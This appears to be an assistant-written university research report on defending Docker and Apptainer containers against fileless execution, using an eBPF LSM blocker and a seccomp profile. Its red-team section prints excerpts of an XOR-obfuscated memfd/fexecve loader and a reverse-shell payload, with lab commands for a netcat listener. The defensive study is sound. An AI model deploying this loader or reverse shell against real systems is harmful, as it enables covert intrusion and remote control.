# Phase 3 Deep-Dive: Defensive Architecture and Kernel Enforcement

**Context:** Research on Methods for Application Containment — Vilnius University MICAC
**Author:** Juan Luis Torres Ramos | **Supervisor:** Assoc. Prof. Linas Bukauskas
**Subject:** Defensive Hardening & Dynamic Monitoring (eBPF vs. Native Seccomp)

---

## 1. Executive Summary: The Blue Team Pivot
Phase 2 proved the existence of a scanner gap: a loader can unpack an ELF payload into anonymous memory and execute it without touching disk. Phase 3 demonstrates practical, platform-appropriate mitigations:

- Docker — dynamic, kernel-enforced behavioral detection via eBPF LSM.
- Apptainer — native runtime hardening via seccomp profiles and conservative runtime flags.

This document explains what each component does (mechanical steps and code) and why the approach was chosen (architectural rationale, tradeoffs). Each code excerpt is followed by a short "What" (how it works) and "Why" (design reason / security benefit).

---

## 2. Docker Defense: Real-Time eBPF Enforcement

Goal: Detect and deny the memfd → exec chain used by fileless loaders before any payload gains control.

Rationale: `memfd_create()` by itself is benign for many legitimate apps. Detecting the short sequence — memfd creation followed quickly by exec — gives a high-confidence signal with minimal false positives when scoped properly.

Files: `poc/bpf/memfd_exec_block.bpf.c`, `poc/bpf/memfd_exec_block.c`

### 2.1 BPF state and observability
```c
struct event {
    __u32 pid;
    __u32 uid;
    __u64 delta_ns;
    char comm[16];
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u32);
    __type(value, __u64);
} memfd_ts SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);
} events SEC(".maps");
```
What: `memfd_ts` stores a nanosecond timestamp keyed by PID when a process calls `memfd_create`. `events` is a ring buffer used to notify userland of blocks.

Why: Correlation requires kernel-side ephemeral state. A hash map keyed by PID is efficient for short-lived sequences. The ring buffer provides low-overhead notifications to a user-space monitor.

### 2.2 Targeting (comm helper)
```c
static __always_inline int comm_is_loader(char *comm_out)
{
    char comm[16];
    int match;

    __builtin_memset(comm, 0, sizeof(comm));
    bpf_get_current_comm(&comm, sizeof(comm));

    match = (comm[0] == 'l' && comm[1] == 'o' && comm[2] == 'a' &&
             comm[3] == 'd' && comm[4] == 'e' && comm[5] == 'r' &&
             comm[6] == '\0');

    if (comm_out)
        __builtin_memcpy(comm_out, comm, sizeof(comm));

    return match;
}
```
What: Reads `comm` (process short name) and checks equality with "loader".

Why: PoC-level scoping to reduce false positives. In production, replace this with selectors based on container namespace, image digest, or UID.

### 2.3 Tracepoint: record `memfd_create`
```c
SEC("tracepoint/syscalls/sys_enter_memfd_create")
int tp_memfd_create(struct trace_event_raw_sys_enter *ctx)
{
    __u32 pid = (__u32)(bpf_get_current_pid_tgid() >> 32);
    __u64 ts = bpf_ktime_get_ns();

    bpf_map_update_elem(&memfd_ts, &pid, &ts, BPF_ANY);
    return 0;
}
```
What: On syscall entry, capture a timestamp for this PID.

Why: `memfd_create` is the defining syscall for the fileless chain. Timestamping allows a time-based correlation with a subsequent exec.

### 2.4 LSM hook: block on correlated exec
```c
SEC("lsm/bprm_check_security")
int BPF_PROG(block_exec, struct linux_binprm *bprm)
{
    __u32 pid = (__u32)(bpf_get_current_pid_tgid() >> 32);
    __u64 now = bpf_ktime_get_ns();
    __u64 *ts = bpf_map_lookup_elem(&memfd_ts, &pid);
    char comm[16];

    if (!ts)
        return 0;

    if (!comm_is_loader(comm)) {
        bpf_map_delete_elem(&memfd_ts, &pid);
        return 0;
    }

    if ((now - *ts) < WINDOW_NS) {
        struct event *e;
        e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->pid = pid;
            e->uid = (__u32)bpf_get_current_uid_gid();
            e->delta_ns = now - *ts;
            __builtin_memcpy(e->comm, comm, sizeof(e->comm));
            bpf_ringbuf_submit(e, 0);
        }
        bpf_map_delete_elem(&memfd_ts, &pid);
        return -EPERM;
    }

    bpf_map_delete_elem(&memfd_ts, &pid);
    return 0;
}
```
What: At `bprm_check_security` (right before exec), look up whether this PID created a memfd recently. If it did and matches the selector, emit an event and deny execution by returning `-EPERM`.

Why: LSM hooks are the atomic enforcement point; blocking here guarantees the payload never starts. Emitting an event gives operators an auditable signal.

### 2.5 User-space loader and execution
Key steps in `poc/bpf/memfd_exec_block.c`:

- Raise `RLIMIT_MEMLOCK` so BPF program memory can be pinned.
- Load and attach the BPF object.
- Attach the tracepoint and the LSM program.
- Create a ring buffer to handle `events` and print `[BLOCK] pid=...` lines.

What to run (lab):
```bash
# Build the BPF object and user loader
make bpf-build

# Run defender (needs sudo)
sudo bin/memfd_exec_block bpf/memfd_exec_block.bpf.o
```

Why these choices (tradeoffs):

- Window tuning: Choose narrow `WINDOW_NS` (milliseconds) to match loader timing; too wide increases false positives.
- Selector tuning: `comm` is PoC-simple. For production use container metadata, UID, or cgroup id.
- Kernel support: Requires BPF LSM support (modern kernels + `CONFIG_BPF`). Validate with `bpftool` and kernel BTF.

---

## 2.6 Tools & Setup (eBPF, libbpf, bpftool, clang)

What: A short, practical guide to the tools and host setup required to build and run the eBPF LSM defender used in this project.

Prerequisites (Debian/Ubuntu example):
```bash
sudo apt update
sudo apt install -y build-essential clang llvm libelf-dev libbpf-dev pkg-config gcc-multilib bpftool libbpf-tools libcap-dev make git
```
Notes:
- `clang`/`llvm` are required to compile `.bpf.c` files for the BPF target.
- `bpftool` is used to inspect kernel BTF and features; the Makefile uses it to generate `bpf/vmlinux.h`.
- `libbpf-dev` and `pkg-config` are required to compile the user-space loader (`poc/bpf/memfd_exec_block.c`).

Kernel checks (what to verify):
- Ensure kernel supports BPF and BTF: `bpftool feature`. If missing, check kernel config for `CONFIG_BPF` and `CONFIG_BPF_SYSCALL`.
- LSM attach support: modern kernels (5.7+) with BPF LSM enabled are needed to attach at `lsm/bprm_check_security`.

Build steps (from repo root):
```bash
# generate vmlinux.h (Makefile target will do this automatically if bpftool exists)
make bpf-build

# build user loader/binaries
make build
```
Run the defender (requires root to attach LSM program):
```bash
sudo bin/memfd_exec_block bpf/memfd_exec_block.bpf.o
```
Runtime notes:
- The user loader sets `RLIMIT_MEMLOCK` to `RLIM_INFINITY`; running with `sudo` is required to attach LSM BPF programs on most systems.
- If `bpftool` cannot generate `vmlinux.h`, you may need kernel-debuginfo or a packaged `vmlinux` BTF for your distribution. Consult your distribution docs or use `bpftool btf dump file /sys/kernel/btf/vmlinux format c > bpf/vmlinux.h`.

Apptainer / Seccomp notes:
- Install Apptainer (Debian/Ubuntu example):
```bash
# follow distro-specific package or build from source; example:
sudo apt install -y apptainer
```
- Apply seccomp profile at run time: `apptainer exec --security seccomp:deployment/seccomp_memfd_exec.json <image> <cmd>`
- The Makefile target `make apptainer-defense` writes the correct flags into `logs/apptainer_defense.env` for convenience.

Security and safety:
- Only run these demos in an isolated lab VM. eBPF LSM programs and seccomp profiles can deny legitimate workloads if misapplied.
- Test profiles and BPF selectors on non-production systems before rollout.

---

## 3. Apptainer Defense: Native Seccomp Profile & Surface Reduction

Goal: Prevent the fileless exec primitive by denying the syscalls required to create and execute anonymous in-memory binaries, and reduce the runtime attack surface.

Files: `poc/deployment/seccomp_memfd_exec.json`, `poc/Makefile` (apptainer targets)

### 3.1 Seccomp profile (what it is)
```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "flags": ["SECCOMP_FILTER_FLAG_LOG"],
  "syscalls": [
    { "names": ["memfd_create"], "action": "SCMP_ACT_ERRNO", "errnoRet": 1 },
    { "names": ["execveat"],      "action": "SCMP_ACT_ERRNO", "errnoRet": 1 }
  ]
}
```
What: Allows all syscalls by default but returns `errno` for `memfd_create` and `execveat`.

Why: Denying `memfd_create` prevents creation of anonymous executable backing, and denying `execveat` stops execution paths that use `AT_EMPTY_PATH` semantics (fexecve → execveat with AT_EMPTY_PATH). `SECCOMP_FILTER_FLAG_LOG` directs kernel logging for denied calls.

### 3.2 Applying the profile (how)
The Makefile target `make apptainer-defense` writes the flags to `logs/apptainer_defense.env`:

```bash
APPTAINER_DEFENSE_FLAGS="--security seccomp:deployment/seccomp_memfd_exec.json"
echo "$APPTAINER_DEFENSE_FLAGS" > logs/apptainer_defense.env

# Then run:
apptainer exec $APPTAINER_DEFENSE_FLAGS deployment/apptainer-victim.sif /tmp/loader
```

What: The container runtime enforces the seccomp profile; the loader receives `EPERM` when invoking the denied syscalls and fails early.

Why: Seccomp is a runtime, in-process primitive that requires no additional kernel modules. It's low overhead and tightly scoped.

### 3.3 Additional runtime hardening flags
- `--drop-caps` — strips capabilities; prevents use of sensitive kernel features used in escape primitives (e.g., `CAP_SYS_ADMIN`).
- `--network none` — isolates network to prevent callbacks.

Why: Defense-in-depth. Seccomp targets specific syscalls; flags reduce the likelihood of alternative escape avenues.

### 3.4 Tradeoffs and cautions

- Seccomp may break legitimate programs that use `memfd_create` (e.g., runtime loaders, updaters). Test profiles in staging.
- Audit/logging: Denied syscalls should be collected by `auditd`/syslog and forwarded to SIEM.

---

## 4. PoC Red Team Code Walkthrough (mechanics + rationale)

Files: `poc/src/loader.c`, `poc/src/payload.c`, `poc/src/payload_blob.h`

### 4.1 `loader.c` — step-by-step
```c
(void)prctl(PR_SET_NAME, "loader", 0, 0, 0);

/* decode XOR payload */
unsigned char *decoded = malloc(PAYLOAD_SIZE);
xor_decode(decoded, payload_blob, PAYLOAD_SIZE);

/* memfd_create */
int memfd = raw_memfd_create("", MFD_CLOEXEC | MFD_ALLOW_SEALING);

/* write payload */
write(memfd, decoded, PAYLOAD_SIZE);

/* optional sealing */
fcntl(memfd, F_ADD_SEALS, F_SEAL_WRITE|...);

/* execute */
char *exec_argv[] = {"payload", NULL};
fexecve(memfd, exec_argv, envp);
```
What: The loader decodes an embedded XOR blob into memory, writes it to an anonymous memfd, optionally seals it, and executes it via `fexecve`.

Why: XOR obfuscation defeats simple signature checks. `memfd_create` + `fexecve` is a compact, reliable fileless execution primitive on Linux.

### 4.2 `payload.c` — reverse shell mechanics
```c
int sock = socket(AF_INET, SOCK_STREAM, 0);
connect(sock, (struct sockaddr *)&addr, sizeof(addr));
for (int i = 0; i < 3; i++) dup2(sock, i);
execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
```
What: The payload connects back to a listener, duplicates the socket to stdin/stdout/stderr, and starts a shell.

Why: A simple, observable C2 primitive used for PoC. It produces clear network and syscall artifacts for analytics.

### 4.3 Forensic signals to monitor

- `memfd_create()` calls (tracepoint / audit)
- `fcntl(F_ADD_SEALS)` after memfd writes
- `execve`/`execveat` attempts with `/memfd` backing (`/proc/<pid>/maps` shows `/memfd: (deleted)`)
- `socket()` + `connect()` to non-standard endpoints
- `dup2()` + `execve("/bin/sh")` sequences

---

## 5. Verification and Repro Steps (lab commands)

1) Build and run Docker eBPF defender:
```bash
make bpf-build
sudo bin/memfd_exec_block bpf/memfd_exec_block.bpf.o
```

2) Run attack demo in Docker (listener first):
```bash
# Terminal A (listener)
ncat -lvp 4444

# Terminal B (build + start victim + inject loader)
make docker-attack
# Then trigger:
docker exec -i victim-webapp /loader
```

Expected: Defender prints `[BLOCK] pid=... comm=loader delta_ns=...`, and the reverse shell does not reach the listener.

3) Run Apptainer hardened flow:
```bash
make apptainer-defense
make apptainer-attack
```
Expected: `memfd_create` or `execveat` is denied; loader fails and audit logs record the denial.

---

## 6. Caveats, Limitations & Recommendations

- False positives: `comm`-based scoping is PoC only. Use container metadata/cgroup selectors in production.
- Kernel/Platform: BPF LSM requires proper kernel config and libbpf. Seccomp requires runtime support (Apptainer accepts JSON profiles).
- Time-window tuning: Balance sensitivity vs. coverage. Start small, broaden after benign observation.
- Seccomp compatibility: Test extensively; consider whitelists for known updaters.
- Logging & pipeline: Integrate BPF ring-buffer events and audit logs with central logging (ELK/SIEM) for triage.

---

## 7. Actionable Checklist

- [x] Build BPF object: `make bpf-build`
- [x] Run Docker defender: `sudo bin/memfd_exec_block bpf/memfd_exec_block.bpf.o`
- [x] Test loader in Docker: `make docker-attack` + `docker exec -i victim-webapp /loader`
- [x] Apply Apptainer seccomp: `make apptainer-defense` and `make apptainer-attack`
- [ ] Replace `comm` selector with production-safe scoping (container id / cgroup)
- [ ] Integrate logs into SIEM for long-term analytics

---

If you want I can also:

- Produce a line-by-line annotated version of `memfd_exec_block.bpf.c` for training materials.
- Create a small `README.md` with exact commands and expected outputs to include in `poc/`.

Tell me which follow-up you prefer and I will apply it.
